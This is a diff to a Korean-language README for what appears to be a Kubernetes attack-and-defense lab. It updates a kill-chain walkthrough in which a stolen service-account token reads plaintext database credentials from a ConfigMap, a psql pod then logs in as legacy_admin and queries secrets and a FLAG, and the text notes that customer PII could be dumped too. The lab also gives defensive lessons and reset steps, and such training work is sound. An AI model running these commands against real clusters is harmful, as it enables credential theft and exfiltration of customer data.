@@ -66,8 +66,10 @@ nc -zv postgres.database.svc.cluster.local 5432     # → open (차단 없음)
 
 **④ 목표탈취 — DB 접속해 FLAG 획득** (attacker 셸 나와서, psql 있는 파드로):
 ```bash
+# ① 평문 ConfigMap(legacy-db-config)에서 유출된 legacy_admin 크레덴셜로 직접 접속.
+#   (god-view actor 스코핑: 크라운 판정은 role=legacy_admin 접속만 센다 → 앱(appuser) 조회와 구분)
 kubectl -n frontend run dbattack --rm -it --image=postgres:16-alpine --restart=Never -- \
-  psql "postgresql://appuser:devpassword123@postgres.database.svc.cluster.local:5432/customerdb" \
+  psql "postgresql://legacy_admin:L3gacyAdm1n!2019@postgres.database.svc.cluster.local:5432/customerdb" \
   -c "SELECT key, value FROM internal_secrets;"
 # → FLAG{...}  +  고객 PII도 SELECT * FROM customers 로 탈취 가능
 ```
@@ -147,10 +149,10 @@ T1610 차단. `restrict_pod_security default`(enforce=baseline)면 privileged �
 
 ### 다경로 크레덴셜 walkthrough (T1552.001 ConfigMap)
 ```bash
-# ② 로 토큰 탈취 후, Secret 이 아닌 '평문 ConfigMap' 에서 같은 DB 비번 획득(두 번째 경로):
+# ② 로 토큰 탈취 후, Secret 이 아닌 '평문 ConfigMap' 에서 레거시 관리자 DB 비번 획득(두 번째 경로):
 wget -qO- --header="Authorization: Bearer $TOK" --no-check-certificate \
   https://kubernetes.default.svc/api/v1/namespaces/backend/configmaps/legacy-db-config
-# → data.DB_PASSWORD = devpassword123 (base64 아님, 평문). → ④ 로 직행 가능.
+# → data.DB_PASSWORD = L3gacyAdm1n!2019 (base64 아님, 평문). legacy_admin 으로 ④ 직행.
 ```
 교훈: 과권한은 Secret 만의 문제가 아니다. 방어자는 Secret 잠금만으론 부족하고 `restrict_rbac`
 (조회 권한 자체 축소)로 Secret·ConfigMap 두 경로를 함께 닫아야 한다.
@@ -162,7 +164,7 @@ T1046/T1613/T1069 는 정찰이라 정상 조회와 구분이 어렵고 전용 �
 
 ## 리셋
 완전 원복은 VMware 스냅샷 복원(5단계 자동화). 단, 운영 루프는 **A2 k8s-네이티브 리셋**
-(`orchestrator/baseline.py`)을 쓴다 — 에피소드 경계마다: NetworkPolicy 전삭제 + [Wave1]
+(`orchestrator/baseline.py`)을 쓴다 — 회차 경계마다: NetworkPolicy 전삭제 + [Wave1]
 공격자 생성 파드 정리(default 전삭제 + `created-by=attacker` 라벨) + [Wave1] PodSecurity
 enforce 라벨 제거 + killchain 매니페스트 재적용(과권한 바인딩·토큰·configmap 복구) + 발판 rollout.
 수동으론 `teardown-services.sh` 후 재배포 + 방어 레퍼런스로 적용한 NP/RBAC/PSA 수동 삭제.
